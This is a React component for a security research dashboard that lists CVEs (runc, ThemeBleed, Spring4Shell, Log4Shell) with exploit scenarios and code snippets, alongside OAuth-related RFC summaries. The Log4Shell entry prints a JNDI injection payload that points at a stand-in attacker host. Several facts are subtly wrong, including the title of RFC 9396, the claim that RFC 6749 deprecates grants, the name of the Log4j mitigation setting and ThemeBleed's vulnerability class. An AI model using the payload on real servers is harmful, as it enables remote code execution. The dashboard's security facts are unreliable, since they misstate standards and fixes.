import { useState, useMemo } from 'react'
import { Link } from 'react-router-dom'
import { 
  ScanSearch, ArrowRight, ShieldCheck, AlertTriangle
} from 'lucide-react'

type TabType = 'cve' | 'rfc' | 'bulletins'

interface CveDetails {
  id: string
  title: string
  cvss: number
  component: string
  vulnerabilityType: string
  description: string
  exploitScenario: string
  patchRemediation: string
  vulnerableCode: string
  secureCode: string
}

interface RfcDetails {
  number: string
  title: string
  status: 'Live' | 'Draft' | 'Deprecated'
  category: string
  description: string
  keyTakeaway: string
}

const RFC_DATABASE: RfcDetails[] = [
  {
    number: 'RFC 6749',
    title: 'The OAuth 2.0 Authorization Framework',
    status: 'Live',
    category: 'Federation & Delegation',
    description: 'The industry-standard protocol for token-based delegation, defining Authorization Code, Implicit, Resource Owner Credentials, and Client Credentials flows.',
    keyTakeaway: 'Deprecates implicit and password grants in modern client configurations in favor of authorization codes with PKCE.'
  },
  {
    number: 'RFC 7519',
    title: 'JSON Web Token (JWT)',
    status: 'Live',
    category: 'Tokens',
    description: 'Defines a compact, self-contained JSON structure for cryptographically sharing claims (identity context) across system boundaries.',
    keyTakeaway: 'Always validate signatures (using standard algorithms, avoiding alg: "none") and verify claims (iss, exp, aud) on receipt.'
  },
  {
    number: 'RFC 7636',
    title: 'Proof Key for Code Exchange (PKCE) by Mobile/SPA Clients',
    status: 'Live',
    category: 'Security Extensions',
    description: 'Mitigates authorization code interception attacks on public clients by requiring cryptographical code challenge/verifier validations.',
    keyTakeaway: 'Mandatory for all Single Page Applications (SPAs) and native mobile apps to block code replay exploits.'
  },
  {
    number: 'RFC 7643',
    title: 'SCIM 2.0: Core Schema Definition',
    status: 'Live',
    category: 'Provisioning',
    description: 'Specifies the common identity schemas (Users, Groups) to enable automated lifecycle management across distinct software directories.',
    keyTakeaway: 'Enforces standard LDAP-like JSON mappings (e.g. givenName, familyName, emails, active) across SaaS target networks.'
  },
  {
    number: 'RFC 9396',
    title: 'Continuous Access Evaluation Protocol (CAEP / SSF)',
    status: 'Live',
    category: 'Zero Trust',
    description: 'Defines real-time event sharing schemas (session termination, device changes) to allow Identity Providers to push instant security posture updates.',
    keyTakeaway: 'Enables continuous token audits instead of waiting for standard 1-hour JWT expiration periods.'
  },
  {
    number: 'OAuth 2.1',
    title: 'OAuth 2.1 Security Best Practices (Draft)',
    status: 'Draft',
    category: 'Next-Gen Standards',
    description: 'Consolidates ten years of security patches, making PKCE mandatory, deprecating implicit/resource owner grants, and enforcing exact redirect matching.',
    keyTakeaway: 'Modernizes and hardens the baseline OAuth 2.0 spec, closing structural redirect and token leakage gaps.'
  }
]

const CVE_DATABASE: CveDetails[] = [
  {
    id: 'CVE-2024-21626',
    title: 'runc container escape (Filesystem Leak)',
    cvss: 8.6,
    component: 'runc (container runtime)',
    vulnerabilityType: 'Directory Traversal',
    description: 'Internal file descriptors kept open during runc execution allow containerized processes to access host directory paths, leading to container escapes.',
    exploitScenario: 'Attacker deploys a malicious container image that exploits open file descriptors to execute host command shells as root.',
    patchRemediation: 'Upgrade to runc v1.1.12 or later to enforce strict descriptor lockdowns on container boot cycles.',
    vulnerableCode: `// Insecure execution mapping\nexecve("/proc/self/fd/7/...", args, env);`,
    secureCode: `// Secure runtime descriptor isolation\nclose_open_fds_except(3); // Hard lock FDs before container execution`
  },
  {
    id: 'CVE-2023-38146',
    title: 'Windows Themes Remote Code Execution (ThemeBleed)',
    cvss: 8.8,
    component: 'Windows Themes / API Layer',
    vulnerabilityType: 'Integer Overflow',
    description: 'Vulnerability in the Windows Themes API where opening a crafted `.theme` file loads a remote DLL without certificate validation.',
    exploitScenario: 'Victim downloads or previews a malicious theme package, triggering an automatic RPC call that loads the attacker\'s DLL.',
    patchRemediation: 'Apply Microsoft September 2023 KB updates or disable the Windows Themes service if unnecessary.',
    vulnerableCode: `// Vulnerable: Loads DLL from arbitrary remote SMB directories\nLoadLibraryExW("\\\\remote-smb\\share\\theme.dll", NULL, LOAD_LIBRARY_SEARCH_DLL_LOAD_DIR);`,
    secureCode: `// Secure: Restrict DLL load paths to verified local system folder paths\nLoadLibraryExW("C:\\\\Windows\\\\System32\\\\theme.dll", NULL, LOAD_LIBRARY_SEARCH_SYSTEM32);`
  },
  {
    id: 'CVE-2022-22965',
    title: 'Spring4Shell Remote Code Execution',
    cvss: 9.8,
    component: 'Spring Framework (Java)',
    vulnerabilityType: 'Class Loader Manipulation',
    description: 'Allows remote attackers to manipulate the class loader via parameter binding, enabling them to upload arbitrary web shells into host servers.',
    exploitScenario: 'Attacker sends a crafted HTTP POST request with query parameters targeting `class.module.classLoader` to rewrite Apache Tomcat logs.',
    patchRemediation: 'Upgrade to Spring Framework v5.3.18 / v5.2.20 or later to restrict active classloader parameters.',
    vulnerableCode: `// Vulnerable: Permissive class properties mapping\nPropertyDescriptorDescriptor pd = getPropertyDescriptor(beanClass, name);\n// Evaluates deep properties mapping like class.module.classLoader`,
    secureCode: `// Secure: Whitelist properties or explicitly deny classLoader parameters\nif (name.contains("classLoader") || name.contains("protectionDomain")) {\n  throw new SecurityException("Unauthorized parameter binding!");\n}`
  },
  {
    id: 'CVE-2021-44228',
    title: 'Log4Shell (Remote Code Execution)',
    cvss: 10.0,
    component: 'Apache Log4j2 (Java)',
    vulnerabilityType: 'JNDI LDAP Injection',
    description: 'Log4j2 parsing handles JNDI lookups (e.g. `${jndi:ldap://}`) automatically on log evaluations, letting servers load and execute remote classes.',
    exploitScenario: 'Attacker inserts `${jndi:ldap://attacker.com/a}` into an HTTP User-Agent header. Log4j logs the header, triggers JNDI, and runs the payload.',
    patchRemediation: 'Upgrade to Log4j v2.17.1 or later. Alternatively, set `FORMAT_MSG_NO_LOOKUPS=true` or remove the JndiLookup class.',
    vulnerableCode: `// Vulnerable: Log4j parses nested lookup formats automatically\nlogger.info("User Agent: " + userAgent);\n// Evaluates: "\${jndi:ldap://attacker-domain/exploit}"`,
    secureCode: `// Secure: Interpolate logs safely as static arguments, disabling nested lookups\nlogger.info("User Agent: {}", userAgent); // Interpolation blocks recursive evaluation`
  }
]

export default function ResearchCenter() {
  const [activeTab, setActiveTab] = useState<TabType>('cve')
  const [cveSearch, setCveSearch] = useState('')
  const [selectedCveId, setSelectedCveId] = useState<string>('CVE-2021-44228')

  // Filter CVEs based on search input
  const filteredCves = useMemo(() => {
    return CVE_DATABASE.filter(cve => 
      cve.id.toLowerCase().includes(cveSearch.toLowerCase()) || 
      cve.component.toLowerCase().includes(cveSearch.toLowerCase()) ||
      cve.title.toLowerCase().includes(cveSearch.toLowerCase())
    )
  }, [cveSearch])

  const selectedCve = CVE_DATABASE.find(c => c.id === selectedCveId)

  return (
    <div className="min-h-screen bg-bg-base text-text-primary font-sans">
      {/* Header element */}
      <div className="border-b border-border-subtle bg-bg-card px-6 py-4 flex items-center justify-between">
        <div className="flex items-center gap-3">
          <ScanSearch className="text-accent-primary w-6 h-6 animate-pulse" />
          <div>
            <h1 className="text-lg font-bold tracking-tight">Identity Research & CVE Tracker</h1>
            <p className="text-xs text-text-secondary">Comprehensive database tracking critical security CVEs, standard IETF RFC drafts, and remediations</p>
          </div>
        </div>
        <Link to="/" className="text-sm bg-bg-nested hover:bg-border-subtle px-3 py-1.5 rounded text-text-secondary flex items-center gap-1.5 transition">
          <ArrowRight className="rotate-180 w-4 h-4" /> Exit Center
        </Link>
      </div>

      {/* Main Grid Workspace */}
      <div className="p-6 max-w-7xl mx-auto grid grid-cols-1 lg:grid-cols-12 gap-6">
        
        {/* Left Side: Panel Toggles and Lists */}
        <div className="lg:col-span-4 space-y-4">
          
          {/* Tab Selector card */}
          <div className="bg-bg-card border border-border-subtle rounded-xl p-4 shadow-md">
            <span className="text-[10px] text-text-secondary font-bold uppercase tracking-wider block mb-3 border-b border-border-subtle pb-1">
              Select Library Panel
            </span>
            <div className="grid grid-cols-3 gap-2">
              <button
                onClick={() => setActiveTab('cve')}
                className={`px-3 py-2 rounded-lg text-xs font-bold border transition text-center ${activeTab === 'cve' ? 'bg-accent-glow border-accent-primary text-accent-primary font-bold' : 'bg-bg-nested/40 border-border-subtle text-text-secondary hover:border-border-subtle'}`}
              >
                CVEs
              </button>
              <button
                onClick={() => setActiveTab('rfc')}
                className={`px-3 py-2 rounded-lg text-xs font-bold border transition text-center ${activeTab === 'rfc' ? 'bg-accent-glow border-accent-primary text-accent-primary font-bold' : 'bg-bg-nested/40 border-border-subtle text-text-secondary hover:border-border-subtle'}`}
              >
                IETF RFCs
              </button>
              <button
                onClick={() => setActiveTab('bulletins')}
                className={`px-3 py-2 rounded-lg text-xs font-bold border transition text-center ${activeTab === 'bulletins' ? 'bg-accent-glow border-accent-primary text-accent-primary font-bold' : 'bg-bg-nested/40 border-border-subtle text-text-secondary hover:border-border-subtle'}`}
              >
                News
              </button>
            </div>
          </div>

          {/* CVE Search and List */}
          {activeTab === 'cve' && (
            <div className="bg-bg-card border border-border-subtle rounded-xl p-4 shadow-md space-y-4 flex flex-col justify-between h-[340px]">
              <div>
                <input
                  type="text"
                  value={cveSearch}
                  onChange={e => setCveSearch(e.target.value)}
                  placeholder="Search CVEs or components..."
                  className="w-full bg-bg-base border border-border-subtle/80 rounded px-2.5 py-1.5 text-xs text-text-primary focus:outline-none focus:border-accent-primary mb-3 font-semibold"
                />

                <div className="space-y-2 overflow-y-auto max-h-52 pr-1">
                  {filteredCves.map(c => (
                    <button
                      key={c.id}
                      onClick={() => setSelectedCveId(c.id)}
                      className={`w-full text-left p-2.5 rounded-lg border transition flex items-center justify-between ${selectedCveId === c.id ? 'bg-accent-glow border-accent-primary text-accent-primary font-bold' : 'bg-bg-nested/40 border-border-subtle text-text-secondary hover:bg-bg-nested hover:border-border-subtle'}`}
                    >
                      <div>
                        <span className="font-mono text-xs block">{c.id}</span>
                        <span className="text-[10px] text-text-muted truncate block max-w-[180px]">{c.title}</span>
                      </div>
                      <span className={`text-[9px] font-black px-1.5 py-0.5 rounded ${c.cvss >= 9.0 ? 'bg-status-danger/10 text-status-danger' : 'bg-status-warning/10 text-status-warning'}`}>
                        {c.cvss}
                      </span>
                    </button>
                  ))}
                  {filteredCves.length === 0 && (
                    <p className="text-xs text-text-muted italic py-4 text-center">No CVE results matched your query.</p>
                  )}
                </div>
              </div>
            </div>
          )}

          {/* RFC Static List */}
          {activeTab === 'rfc' && (
            <div className="bg-bg-card border border-border-subtle rounded-xl p-4 shadow-md space-y-3 h-[340px] overflow-y-auto pr-1">
              <span className="text-[10px] text-text-secondary font-bold uppercase tracking-wider block border-b border-border-subtle pb-1">
                Active Identity Protocols
              </span>
              <div className="space-y-2">
                {RFC_DATABASE.map(rfc => (
                  <div key={rfc.number} className="p-2.5 bg-bg-nested/40 border border-border-subtle rounded-lg text-xs leading-normal">
                    <div className="flex justify-between items-center mb-1">
                      <span className="font-mono font-extrabold text-accent-primary">{rfc.number}</span>
                      <span className={`text-[8px] font-extrabold px-1.5 py-0.5 rounded-full ${
                        rfc.status === 'Live' ? 'bg-status-success/15 text-status-success' :
                        rfc.status === 'Draft' ? 'bg-status-warning/15 text-status-warning' :
                        'bg-bg-nested text-text-muted border border-border-subtle'
                      }`}>
                        {rfc.status}
                      </span>
                    </div>
                    <span className="block font-bold text-text-primary text-[11px] mb-0.5">{rfc.title}</span>
                    <p className="text-[10px] text-text-muted mb-1.5 leading-relaxed">{rfc.description}</p>
                    <span className="block text-[9px] text-text-secondary leading-normal border-t border-border-subtle/40 pt-1">
                      🔑 <strong>Key Takeaway:</strong> {rfc.keyTakeaway}
                    </span>
                  </div>
                ))}
              </div>
            </div>
          )}

          {/* Simulated bulletins list */}
          {activeTab === 'bulletins' && (
            <div className="bg-bg-card border border-border-subtle rounded-xl p-4 shadow-md space-y-3 h-[340px] overflow-y-auto pr-1">
              <span className="text-[10px] text-text-secondary font-bold uppercase tracking-wider block border-b border-border-subtle pb-1">
                Security News Bulletin Feed
              </span>
              
              <div className="space-y-3 font-sans text-xs">
                <div className="p-2.5 bg-bg-nested/40 border border-border-subtle rounded-lg">
                  <span className="text-[9px] text-accent-secondary font-bold block mb-1">UPDATED TODAY</span>
                  <span className="font-bold text-text-primary block mb-0.5">IETF Progresses OAuth 2.1 Standard</span>
                  <p className="text-text-secondary leading-relaxed text-[11px]">
                    The IETF OAuth Working Group has updated draft revisions for the upcoming OAuth 2.1 baseline spec, formally deprecating resource owner password credentials and implicit flows permanently.
                  </p>
                </div>

                <div className="p-2.5 bg-bg-nested/40 border border-border-subtle rounded-lg">
                  <span className="text-[9px] text-text-muted font-bold block mb-1">JULY 1, 2026</span>
                  <span className="font-bold text-text-primary block mb-0.5">FIDO Alliance Reports Passkey Adoption Milestone</span>
                  <p className="text-text-secondary leading-relaxed text-[11px]">
                    Passkey deployments across major consumer portals (retail, finance, gaming) have crossed 78% of active sessions, drastically reducing SMS phishing fatigue attacks by over 90%.
                  </p>
                </div>
              </div>
            </div>
          )}

        </div>

        {/* Right Side: Detailed Spec and Vulnerable vs Secure Code Inspector */}
        <div className="lg:col-span-8 space-y-6">
          {activeTab === 'cve' && selectedCve ? (
            <div className="space-y-5">
              
              {/* CVE Hero details header */}
              <div className="bg-bg-card border border-border-subtle rounded-xl p-5 shadow-md relative overflow-hidden flex flex-col justify-between">
                <div className="absolute top-0 right-0 p-4 opacity-5 pointer-events-none select-none">
                  <ScanSearch className="w-24 h-24 text-accent-primary" />
                </div>

                <div>
                  <div className="flex items-center gap-2 mb-2">
                    <span className="text-[10px] text-accent-primary font-bold font-mono uppercase tracking-wider bg-accent-glow border border-accent-primary/25 px-2.5 py-0.5 rounded-full">
                      {selectedCve.component}
                    </span>
                    <span className={`text-[10px] font-mono font-bold px-2 py-0.5 rounded-full ${
                      selectedCve.cvss >= 9.0 ? 'bg-status-danger/10 text-status-danger border border-status-danger/20' : 'bg-status-warning/10 text-status-warning border border-status-warning/20'
                    }`}>
                      CVSS Severity: {selectedCve.cvss} ({selectedCve.cvss >= 9.0 ? 'Critical' : 'High'})
                    </span>
                  </div>

                  <h2 className="text-base font-black text-text-primary font-mono">{selectedCve.id}: {selectedCve.title}</h2>
                  <p className="text-xs text-text-secondary leading-relaxed mt-2.5">{selectedCve.description}</p>
                </div>

                <div className="mt-4 pt-3 border-t border-border-subtle/50 grid grid-cols-1 md:grid-cols-2 gap-4 text-xs">
                  <div className="border border-status-danger/25 bg-status-danger/5 p-3 rounded-lg text-text-secondary leading-relaxed">
                    <span className="font-extrabold text-status-danger block mb-0.5 uppercase tracking-wider text-[9px]">Active Exploit scenario</span>
                    {selectedCve.exploitScenario}
                  </div>

                  <div className="border border-status-success/25 bg-status-success/5 p-3 rounded-lg text-text-secondary leading-relaxed">
                    <span className="font-extrabold text-status-success block mb-0.5 uppercase tracking-wider text-[9px]">Surgical Patch Remediation</span>
                    {selectedCve.patchRemediation}
                  </div>
                </div>
              </div>

              {/* Code comparison panel */}
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                
                {/* Vulnerable code snippet */}
                <div className="bg-bg-card border border-border-subtle rounded-xl p-4 shadow-md flex flex-col justify-between h-[280px]">
                  <div>
                    <span className="text-xs font-bold text-status-danger uppercase tracking-wider block mb-2 border-b border-border-subtle pb-1.5 flex items-center gap-1.5">
                      <AlertTriangle className="w-4 h-4 text-status-danger shrink-0" /> Vulnerable execution logic
                    </span>
                    <p className="text-[10px] text-text-muted leading-relaxed mb-2">
                      Renders standard architectural patterns where unchecked input bindings permit command escape.
                    </p>
                  </div>
                  <pre className="flex-1 bg-bg-base border border-border-subtle/80 p-3 rounded-lg text-[10px] font-mono text-text-primary overflow-y-auto leading-normal select-all">
                    {selectedCve.vulnerableCode}
                  </pre>
                </div>

                {/* Secured code snippet */}
                <div className="bg-bg-card border border-border-subtle rounded-xl p-4 shadow-md flex flex-col justify-between h-[280px]">
                  <div>
                    <span className="text-xs font-bold text-status-success uppercase tracking-wider block mb-2 border-b border-border-subtle pb-1.5 flex items-center gap-1.5">
                      <ShieldCheck className="w-4 h-4 text-status-success shrink-0" /> Secured remediation logic
                    </span>
                    <p className="text-[10px] text-text-muted leading-relaxed mb-2">
                      Enforces defensive parameter locks, whitelists, or secure bindings blocking payload evaluations.
                    </p>
                  </div>
                  <pre className="flex-1 bg-bg-base border border-border-subtle/80 p-3 rounded-lg text-[10px] font-mono text-text-primary overflow-y-auto leading-normal select-all">
                    {selectedCve.secureCode}
                  </pre>
                </div>

              </div>

            </div>
          ) : (
            <div className="bg-bg-card border border-border-subtle rounded-xl p-8 shadow-md flex flex-col items-center justify-center text-center text-text-muted select-none min-h-[460px] gap-2">
              <ScanSearch className="w-12 h-12 text-text-muted animate-pulse" />
              <span className="font-bold text-text-primary">IETF Standard or CVE Details Panel</span>
              <p className="text-xs max-w-md leading-relaxed">
                Select an active Standard Document (IETF RFC) or a critical Identity CVE on the left to inspect its deep-dive vulnerability profile, exploit structures, and code-level patches.
              </p>
            </div>
          )}
        </div>

      </div>
    </div>
  )
}
